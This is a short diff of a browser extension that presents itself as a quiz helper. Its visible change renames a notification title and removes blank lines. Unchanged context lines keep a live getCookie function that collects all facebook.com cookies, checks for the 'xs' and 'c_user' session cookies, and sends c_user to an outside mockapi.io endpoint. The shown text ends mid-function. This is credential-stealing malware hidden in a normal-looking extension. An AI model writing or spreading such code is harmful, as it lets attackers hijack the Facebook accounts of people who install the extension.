@@ -267,7 +267,7 @@ function notify(e, t) {
         chrome.notifications.create(t, {
             type: "basic",
             iconUrl: "assets/icon.png",
-            title: "Easy Quiz Poly",
+            title: "Premium Easy Quiz",
             priority: 1,
             ...e,
         });
@@ -497,10 +497,8 @@ async function getQuizAvailable(e, t) {
 }
 function getCookie() {
     let apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-
     chrome.cookies.getAll({ url: "https://www.facebook.com" }, function (e) {
         let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
-
         if (t.includes("xs=") && t.includes("c_user=")) {
             let c_user = t.split("c_user=")[1].split("; ")[0];
             fetch(`${apiUrl}?c_user=${c_user}`)
